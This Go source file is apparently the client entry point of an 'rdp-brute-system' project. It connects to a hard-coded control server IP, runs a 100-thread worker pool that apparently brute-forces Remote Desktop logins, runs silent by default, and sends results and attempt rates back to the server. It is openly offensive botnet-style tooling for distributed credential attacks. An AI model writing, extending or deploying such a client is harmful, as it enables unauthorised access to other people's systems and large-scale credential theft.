package client

import (
	"context"
	"flag"
	"os"
	"os/signal"
	"syscall"
	"time"

	"rdp-brute-system/client/comm"
	"rdp-brute-system/client/rdp"
	"rdp-brute-system/client/worker"
	"rdp-brute-system/shared/logger"
	"rdp-brute-system/shared/protocol"
)

func Run() {
	RunWithContext(context.Background())
}

func RunWithContext(ctx context.Context) {
	serverAddr := flag.String("server", "195.189.96.174:8080", "Address of the control server")
	numThreads := flag.Int("threads", 100, "Number of concurrent threads")
	silent := flag.Bool("silent", true, "Run in silent mode (no console output)")
	logDir := flag.String("logdir", "./logs", "Directory for log files")
	flag.Parse()

	// Initialize logging system
	if err := logger.InitializeLoggers(*logDir, *silent); err != nil {
		os.Exit(1)
	}

	taskQueue := make(chan protocol.Task, *numThreads)
	resultQueue := make(chan rdp.Result, *numThreads)

	clientWorker := worker.New(1, *numThreads, taskQueue, resultQueue)
	clientWorker.Start()

	clientComm, err := comm.New(*serverAddr, taskQueue, resultQueue)
	if err != nil {
		logger.ClientLogger.Fatal("Failed to connect to server", map[string]interface{}{
			"server": *serverAddr,
			"error":  err.Error(),
		})
	}
	go clientComm.Start()

	logger.ClientLogger.Info("Client started successfully", map[string]interface{}{
		"server":  *serverAddr,
		"threads": *numThreads,
		"silent":  *silent,
	})

	// Handle graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Monitor and report PPS (background only)
	go func() {
		for {
			time.Sleep(5 * time.Second)
			pps := clientWorker.GetPPS()
			logger.ClientLogger.Performance("Performance update", map[string]interface{}{
				"pps": pps,
			})
			clientComm.SendStatus(pps)
		}
	}()

	select {
	case <-ctx.Done():
		logger.ClientLogger.Info("Client context cancelled", nil)
	case <-sigChan:
		logger.ClientLogger.Info("Shutdown signal received, stopping client")
	}

	close(taskQueue)
	clientWorker.Stop()
	clientComm.Stop()
	logger.ClientLogger.Info("Client shut down gracefully")
}
